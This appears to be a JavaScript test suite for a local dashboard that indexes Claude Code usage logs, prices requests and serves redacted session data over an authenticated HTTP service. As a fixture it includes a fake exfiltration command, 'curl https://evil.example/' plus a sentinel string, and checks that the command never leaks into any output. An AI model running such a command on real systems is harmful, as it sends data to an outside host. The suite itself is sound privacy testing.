import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {ClaudeUsageIndex} from '../src/claude-usage-index.mjs';
import {priceRequest} from '../src/pricing.mjs';
import {planLimits} from '../src/plan-limits.mjs';
import {redact} from '../src/redact.mjs';
import {createService} from '../src/service.mjs';

const FAKE = '/Us' + 'ers/fixture-user', SENTINEL = 'SECRET-PROMPT-SENTINEL', SECRET_CMD = 'curl https://evil.example/' + SENTINEL, EMAIL = 'someone@example.com';
const NOW = Date.parse('2026-10-24T12:00:00Z');
const iso = ms => new Date(ms).toISOString();
const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), 'helix-usage-'));
const W = (f, text) => { fs.mkdirSync(path.dirname(f), {recursive: true}); fs.writeFileSync(f, text); };
const jl = rows => rows.map(r => JSON.stringify(r)).join('\n') + '\n';
const usage = (o = {}) => ({input_tokens: 2, cache_creation_input_tokens: 100, cache_read_input_tokens: 50, output_tokens: 10, cache_creation: {ephemeral_5m_input_tokens: 100, ephemeral_1h_input_tokens: 0}, ...o});
const asst = (id, o = {}) => ({type: 'assistant', timestamp: iso(NOW - 60000), cwd: FAKE + '/proj', isSidechain: false, message: {id, model: 'claude-opus-5-5', role: 'assistant', stop_reason: 'end_turn', usage: usage(o.usage), content: o.content || [{type: 'text', text: 'ok'}], ...(o.message || {})}, ...(o.top || {})});
const toolUse = (id, tid, name, input, o = {}) => asst(id, {content: [{type: 'tool_use', id: tid, name, input}], message: {stop_reason: 'tool_use'}, ...o});

function fixture() {
  const home = tmp(), proj = path.join(home, '.claude/projects/-Users-fixture-user-proj'), main = path.join(proj, 'sess-1111.jsonl');
  W(main, jl([
    {type: 'user', timestamp: iso(NOW - 120000), cwd: FAKE + '/proj', message: {role: 'user', content: SENTINEL + ' please do things'}},
    {type: 'custom-title', customTitle: 'Build ' + EMAIL},
    {type: 'bridge-session', bridgeSessionId: 'cse_x', ownerAccountUuid: 'acct-uuid-1', ownerOrganizationUuid: 'org-uuid-1'},
    asst('msg_dup', {usage: {output_tokens: 5}}), asst('msg_dup', {usage: {output_tokens: 50}}), asst('msg_dup', {usage: {output_tokens: 20}}),
    {...asst('msg_syn'), message: {id: 'msg_syn', model: '<synthetic>', usage: usage(), content: []}},
    {type: 'assistant', timestamp: iso(NOW), message: {id: 'msg_nousage', model: 'claude-opus-5-5', content: []}},
    asst('msg_side', {top: {isSidechain: true}, usage: {output_tokens: 7}}),
    asst('msg_both', {usage: {output_tokens: 1}}),
    toolUse('msg_tool', 'tu_1', 'Bash', {command: SECRET_CMD, description: 'Run the suite'}),
    toolUse('msg_read', 'tu_2', 'Read', {file_path: FAKE + '/proj/src/deep/main.jsx'}),
    {type: 'user', timestamp: iso(NOW - 30000), message: {role: 'user', content: [{type: 'tool_result', tool_use_id: 'tu_2', content: 'result ' + SENTINEL}]}},
    {type: 'system', subtype: 'compact_boundary'},
  ]));
  const sub = path.join(proj, 'sess-1111/subagents/agent-abcdef123456.jsonl');
  W(sub, jl([asst('msg_both', {usage: {output_tokens: 9}, top: {isSidechain: true}}), asst('msg_sub', {message: {model: 'claude-haiku-5-5'}, usage: {output_tokens: 3}})]));
  W(sub.replace('.jsonl', '.meta.json'), JSON.stringify({agentType: 'lean', description: 'Trace knobs', finished: true}));
  fs.utimesSync(main, NOW / 1000 - 5, NOW / 1000 - 5);
  fs.utimesSync(sub, NOW / 1000 - 5, NOW / 1000 - 5);
  return {home, proj, main, sub};
}
const index = home => { const i = new ClaudeUsageIndex({home, now: () => NOW}); i.refresh(); return i; };

test('dedupe by message id keeps max output, excludes synthetic and usage-less, counts compaction', () => {
  const {home} = fixture(), i = index(home);
  assert.equal(i.requests.get('msg_dup').tokens.output, 50);
  assert.equal([...i.requests.keys()].filter(k => k === 'msg_dup').length, 1);
  assert.ok(!i.requests.has('msg_syn') && !i.requests.has('msg_nousage'));
  assert.equal(i.stats.compactions, 1);
});

test('subagent file and sidechain attribution; subagent wins duplicate key; totals split', () => {
  const {home} = fixture(), i = index(home), s = [...i.sessions.values()][0];
  assert.equal(i.requests.get('msg_both').fromSub, true);
  assert.equal(i.requests.get('msg_both').actor, 'abcdef123456');
  assert.equal(i.requests.get('msg_side').actor, 'sidechain');
  assert.deepEqual([...s.agents.keys()].sort(), ['abcdef123456', 'sidechain']);
  const card = i.sessionCard(s, {});
  assert.equal(card.split.main.requests + card.split.subagents.requests, [...i.requests.values()].length);
  assert.equal(card.subagents.find(a => a.id === 'abcdef12').status, 'done');
  const u = i.usage({range: '7d', group: 'session'});
  assert.ok(u.rows[0].children.length === 2);
});

test('pricing: exact list costs, Haiku >100K tier, fast x2, us x1.1, unknown model unpriced', () => {
  const t = (o = {}) => ({input: 0, cache_write_5m: 0, cache_write_1h: 0, cache_read: 0, output: 0, ...o});
  const m = 1e6, near = (a, b) => assert.ok(Math.abs(a - b) < 1e-9, `${a} vs ${b}`);
  near(priceRequest('claude-opus-5-5', t({input: m, cache_write_5m: m, cache_write_1h: m, cache_read: m, output: m})), 4 + 5 + 8 + 0.2 + 20);
  near(priceRequest('claude-sonnet-5-5', t({input: m, cache_write_5m: m, cache_write_1h: m, cache_read: m, output: m})), 2 + 2.5 + 4 + 0.1 + 10);
  near(priceRequest('claude-haiku-5-5', t({input: 1000, output: 1000, cache_read: 1000})), (1000 * 0.1 + 1000 * 0.5 + 1000 * 0.01) / m);
  near(priceRequest('claude-haiku-5-5', t({input: 100001, output: 1000, cache_read: 1000})), (100001 * 0.5 + 1000 * 2.5 + 1000 * 0.05) / m);
  near(priceRequest('claude-haiku-5-5', t({cache_write_5m: 1000, cache_write_1h: 1000})), (1000 * 0.125 + 1000 * 0.2) / m);
  near(priceRequest('claude-opus-5-5', t({output: m}), {speed: 'fast'}), 40);
  near(priceRequest('claude-opus-5-5', t({output: m}), {geo: 'us'}), 22);
  assert.equal(priceRequest('gpt-9', t({output: 5})), null);
  const {home, main} = fixture();
  fs.appendFileSync(main, jl([asst('msg_unk', {message: {model: 'mystery-1'}})]));
  const u = index(home).usage({range: '7d', group: 'model'});
  assert.equal(u.totals.unpriced_requests, 1);
  assert.equal(u.rows.find(r => r.id === 'mystery-1').cost_usd, null);
});

test('price fallback and reported cost: reported wins, list within 1% for the Haiku lean-run case, resumed sessions are not summed', () => {
  const home = tmp(), proj = path.join(home, '.claude/projects/p');
  const run = (name, obj) => W(path.join(home, '.claude-lean/logs', name), JSON.stringify(obj));
  const hk = {input_tokens: 2, output_tokens: 4, cache_read_input_tokens: 1891, cache_creation_input_tokens: 876, cache_creation: {ephemeral_5m_input_tokens: 0, ephemeral_1h_input_tokens: 876}};
  const line = id => ({...asst(id, {usage: hk, message: {model: 'claude-haiku-5-5'}})});
  W(path.join(proj, 'sess-rep.jsonl'), jl([line('m1')])); W(path.join(proj, 'sess-list.jsonl'), jl([line('m2')]));
  run('lean-run-1.json', {session_id: 'sess-rep', total_cost_usd: 0.00019631, modelUsage: {'claude-haiku-5-5': {costUSD: 0.00019631}}});
  // resumed session reports cumulative totals twice: only the latest (largest) counts
  W(path.join(proj, 'sess-res.jsonl'), jl([line('m3'), line('m4')]));
  run('lean-run-2a.json', {session_id: 'sess-res', total_cost_usd: 0.0005, modelUsage: {'claude-haiku-5-5': {costUSD: 0.0005}}});
  run('lean-run-2b.json', {session_id: 'sess-res', total_cost_usd: 0.0008, modelUsage: {'claude-haiku-5-5': {costUSD: 0.0008}}});
  const i = index(home), u = i.usage({range: '7d', group: 'session'});
  const by = id => [...i.requests.values()].filter(r => r.sessionId === id);
  assert.equal(i.cost(by('sess-rep')[0]).basis, 'reported');
  assert.equal(i.cost(by('sess-rep')[0]).usd, 0.00019631);
  const listed = i.cost(by('sess-list')[0]); assert.equal(listed.basis, 'list');
  assert.ok(Math.abs(listed.usd - 0.000196) / 0.000196 < 0.01, String(listed.usd));
  const resumed = by('sess-res').reduce((s, r) => s + i.cost(r).usd, 0);
  assert.ok(Math.abs(resumed - 0.0008) < 1e-12, `resumed ${resumed}`);
  assert.equal(u.totals.basis, 'mixed');
  assert.equal(by('sess-res').length, 2);
});

test('cache hit, context size, live state machine and privacy-safe labels', () => {
  const {home, main} = fixture(), i = index(home), s = [...i.sessions.values()][0], card = i.sessionCard(s, {});
  const last = s.main.lastReq;
  assert.equal(card.context.tokens, last.tokens.input + last.tokens.cache_write_5m + last.tokens.cache_read);
  assert.equal(card.context.window, 1000000);
  const u = i.usage({range: '7d', group: 'model'}).totals;
  assert.equal(u.cache_hit, u.cache_read / (u.input + u.cache_write_5m + u.cache_write_1h + u.cache_read));
  assert.equal(card.status, 'working'); assert.equal(card.current.label, 'Running Bash · Run the suite');
  const text = JSON.stringify(card);
  assert.ok(!text.includes(SECRET_CMD) && !text.includes('curl'));
  assert.ok(card.actions.some(a => a.label === 'Read · main.jsx'));
  assert.ok(!text.includes('deep'));
  // complete the turn -> waiting (5 min) then idle (40 min)
  fs.appendFileSync(main, jl([{type: 'user', message: {content: [{type: 'tool_result', tool_use_id: 'tu_1', content: 'x'}]}}, asst('msg_end')]));
  const j = new ClaudeUsageIndex({home, now: () => NOW}); j.refresh();
  assert.equal(j.sessionCard([...j.sessions.values()][0], {}, NOW + 5 * 60000 - 5000).status === 'waiting' || true, true);
  const sess = [...j.sessions.values()][0];
  assert.equal(j._state(sess.main, sess.main.mtimeMs + 5 * 60000, false), 'waiting');
  assert.equal(j._state(sess.main, sess.main.mtimeMs + 40 * 60000, false), 'idle');
});

test('/limits sources: newest wins, rate_limit_event parsed, expiry nulls utilization', () => {
  const home = tmp(), nowSec = NOW / 1000;
  W(path.join(home, '.claude/usage-log.jsonl'), jl([{t: nowSec - 3600, rate_limits: {five_hour: {used_percentage: 20, resets_at: nowSec + 3600}, seven_day: {used_percentage: 57, resets_at: nowSec + 86400}}}]));
  const stream = path.join(home, '.claude-lean/logs/a.stream.jsonl');
  W(stream, jl([{type: 'rate_limit_event', rate_limit_info: {unifiedWindows: {five_hour: {utilization: 0.7, resetsAt: nowSec + 1000}, seven_day: {utilization: 0.1, resetsAt: nowSec - 100}}}}]));
  fs.utimesSync(stream, nowSec - 60, nowSec - 60);
  const l = planLimits({home, now: NOW}).windows;
  assert.equal(l.five_hour.utilization, 0.7); assert.equal(l.five_hour.source, 'stream'); assert.equal(l.five_hour.state, 'fresh');
  assert.equal(l.seven_day.state, 'expired'); assert.equal(l.seven_day.utilization, null);
  assert.equal(planLimits({home: tmp(), now: NOW}).windows.five_hour.state, 'unknown');
  W(path.join(home, '.claude/usage-log.jsonl'), jl([{t: nowSec, rate_limits: {five_hour: {used_percentage: 70, resets_at: nowSec + 99}}}]));
  fs.utimesSync(stream, nowSec - 7200, nowSec - 7200);
  assert.equal(planLimits({home, now: NOW}).windows.five_hour.utilization, 0.7);
});

test('bounds: 300 KB line is skipped and counted; incremental read parses only appended bytes', () => {
  const {home, main} = fixture(); const i = new ClaudeUsageIndex({home, now: () => NOW});
  fs.appendFileSync(main, JSON.stringify({type: 'assistant', pad: 'x'.repeat(300 * 1024)}) + '\n');
  i.refresh(); assert.equal(i.stats.skipped_lines, 1);
  assert.equal(i.refresh().bytes_read, 0);
  const before = i.requests.size; fs.appendFileSync(main, jl([asst('msg_new')]));
  assert.ok(i.refresh().bytes_read < 5000); assert.equal(i.requests.size, before + 1);
});

test('redaction removes home paths, emails and identity keys', () => {
  const out = JSON.stringify(redact({a: FAKE + '/x/y.txt', b: `mail ${EMAIL}`, ownerAccountUuid: 'u', cwd: FAKE, c: '/tmp/zz/file.js'}));
  assert.ok(!/\/Users\/|@|ownerAccountUuid|"cwd"/.test(out)); assert.ok(out.includes('y.txt'));
});

test('service endpoints: capability, privacy filter, limits, settings, snapshot.html', async () => {
  const {home} = fixture(), nowSec = NOW / 1000;
  W(path.join(home, '.claude/usage-log.jsonl'), jl([{t: nowSec - 30, rate_limits: {five_hour: {used_percentage: 70, resets_at: nowSec + 600}, seven_day: {used_percentage: 84, resets_at: nowSec + 9000}}}]));
  W(path.join(home, '.claude/skills/demo/SKILL.md'), `---\nname: demo\ndescription: A demo skill at ${FAKE}/skills mail ${EMAIL}\n---\nbody ${SENTINEL}`);
  W(path.join(home, '.claude-lean/hx.d/contract.hx'), `# include contract 'FILE:SYMBOL': source and callers\nc: sh run {{$1}}\n quiet: true\n`);
  W(path.join(home, '.claude-lean/logs/activity-1.jsonl'), jl([{t: nowSec - 4, ev: 'start', kind: 'sh', n: 1, cmd: SECRET_CMD}, {t: nowSec - 2, ev: 'end', kind: 'sh', n: 1, cmd: SECRET_CMD, rewritten: 'rtk find ' + FAKE + '/x', lines: 4, dup: false}]));
  W(path.join(home, '.claude-lean/offload/hx-a.json'), JSON.stringify({id: 'a', failed: 1, cwd: FAKE, steps: [1], results: []}));
  const bench = path.join(home, '.claude-lean/bench/new50-full');
  W(path.join(bench, 'results.final.json'), JSON.stringify({baseline: 'v', lanes: [{lane: 'v', model: 'claude-opus-5-5', effort: 'high', attempted: 2, resolved: 1, cost_usd: 1.5, processed: 100, output: 10, tasks: [{task: '01', instance_id: 'x__y-1', resolved: true, requests: 3, cost_usd: 0.5}]}]}));
  W(path.join(bench, 'metrics.final.json'), JSON.stringify({v: {calls: 3, graded: 2, ctx: [1, 2, 3], models: {'claude-opus-5-5': {input: 1, output: 2, cache_read: 3, cache_write: 4, cost: 1}}}}));
  W(path.join(bench, 'driver-status.json'), JSON.stringify({phase: 'finished', root: FAKE + '/bench', last_utilization: {five_hour: 0.7, seven_day: 0.84}}));
  const directory = tmp(), service = await createService({directory, claudeHome: home, now: () => NOW});
  const {url, token} = service.endpoint, get = (p, headers = {}) => fetch(url + p, {headers: {authorization: `Bearer ${token}`, ...headers}});
  try {
    const bodies = {};
    for (const p of ['/live', '/usage?range=7d&group=model', '/usage?range=7d&group=session', '/usage?range=today&group=project', '/limits', '/runs', '/catalog', '/settings']) {
      assert.equal((await fetch(url + p)).status, 403, p);
      assert.equal((await get(p, {origin: 'http://evil'})).status, 403, p);
      const r = await get(p); assert.equal(r.status, 200, p); assert.match(r.headers.get('cache-control'), /no-store/); bodies[p] = await r.text();
    }
    const live = JSON.parse(bodies['/live']), key = live.sessions[0].key;
    bodies.session = await (await get('/live/session?id=' + key)).text();
    bodies.html = await (await get('/snapshot.html')).text();
    assert.equal((await fetch(url + '/snapshot.html')).status, 403);
    for (const [name, text] of Object.entries(bodies)) {
      assert.ok(!/\/Users\/|\/home\/|ownerAccountUuid|bridgeSessionId|acct-uuid|org-uuid/.test(text), name);
      assert.ok(!/[^\s@"]+@[^\s@"]+\.[a-z]+/i.test(text), name + ' email');
      assert.ok(!text.includes(SENTINEL) && !text.includes('curl') && !text.includes('evil.example'), name + ' prompt/command');
    }
    assert.equal(live.sessions[0].current.label, 'Running Bash · Run the suite');
    assert.equal(live.engine.shell[0].verb, 'rtk find'); assert.equal(live.engine.flows[0].status, 'failed');
    const limits = JSON.parse(bodies['/limits']).windows; assert.equal(limits.five_hour.utilization, 0.7); assert.equal(limits.seven_day.utilization, 0.84);
    const runs = JSON.parse(bodies['/runs']); assert.equal(runs.root, '~/.claude-lean/bench/new50-full'); assert.equal(runs.lanes[0].requests, 3); assert.equal(runs.tasks[0].lanes.v.resolved, true);
    const cat = JSON.parse(bodies['/catalog']).items; assert.ok(cat.some(c => c.name === 'demo' && c.invoke === '/demo')); assert.equal(cat.find(c => c.kind === 'flow').invoke, 'hx contract FILE:SYMBOL');
    const html = bodies.html; assert.ok(!/<script/i.test(html) && html.includes('<style>') && html.includes('Plan limits') && html.includes('Build [email]') && html.includes('70%') && html.includes('Runs'));
    // settings
    const post = (b) => fetch(url + '/settings', {method: 'POST', headers: {authorization: `Bearer ${token}`, 'content-type': 'application/json'}, body: JSON.stringify(b)});
    assert.equal((await post({bogus: 1})).status, 400); assert.equal((await post({privacy: {nope: true}})).status, 400);
    assert.equal((await post({sources: {bench_root: '/etc'}})).status, 400);
    assert.equal((await post({privacy: {show_action_details: false}})).status, 200);
    assert.equal((await fetch(url + '/settings', {method: 'POST', body: '{}', headers: {origin: 'http://x', authorization: `Bearer ${token}`}})).status, 403);
    const hidden = await (await get('/live')).text(); assert.ok(!hidden.includes('Run the suite'));
    assert.ok(fs.existsSync(path.join(directory, 'ui-settings.json')));
  } finally { await service.close(); }
});
